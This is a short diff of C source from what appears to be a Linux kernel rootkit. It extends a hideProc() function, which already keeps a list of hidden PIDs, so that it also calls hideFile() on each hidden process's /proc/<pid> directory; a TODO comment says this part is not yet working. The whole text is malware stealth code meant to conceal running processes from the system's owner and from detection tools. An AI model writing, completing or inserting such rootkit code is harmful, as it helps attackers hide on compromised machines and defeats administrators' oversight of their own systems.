@@ -42,6 +42,7 @@
 #include "hideproc.h"
 #include "funcs.h"
 #include "debug.h"
+#include "hidefile.h"
 
 struct hide_pid {
 	struct list_head list;
@@ -84,6 +85,7 @@ void exit_hideproc() {
 int hideProc(pid_t pid) {
 	int res = -1;
 	struct hide_pid *tmp;
+	char procdir[128];
 
 	// Allocate a new struct hide_pid structure to maintain this new PID, of
 	// just if it wasn't previously hide.
@@ -93,6 +95,11 @@ int hideProc(pid_t pid) {
 		list_add(&(tmp->list), &(hide_pids_list.list));
 		res = 0;
 	}
+
+	// TODO: This is not working right now, debug and fix.
+	// Also hide /proc/<pid>.
+	sprintf(procdir, "/proc/%d", pid);
+	hideFile(procdir);
 
 	print_hide_tasks();
 	return res;
